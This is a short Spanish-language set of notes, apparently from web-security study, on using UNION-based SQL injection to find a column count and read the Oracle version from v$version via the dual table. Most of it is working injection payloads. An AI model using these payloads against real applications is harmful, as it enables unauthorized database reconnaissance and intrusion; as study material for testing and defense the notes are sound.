para ver la version depende del servidor, en oracle hay una tabla llamada dual en donde nosotros podemos consultar del mismo tipo 

' UNION SELECT NULL FROM dual -- - -> ERROR
' UNION SELECT NULL,NULL FROM dual -- - -> OK

dual es una tabla dummy de una sola fila y una sola columna creada por el sistema de oracle, ademas para consultar la version hacemos 

En oracle la columna de la version se encuentra en v$version y se llama BANNER
y la invocamos como

' UNION SELECT NULL, BANNER FROM v$version -- -

y lissto
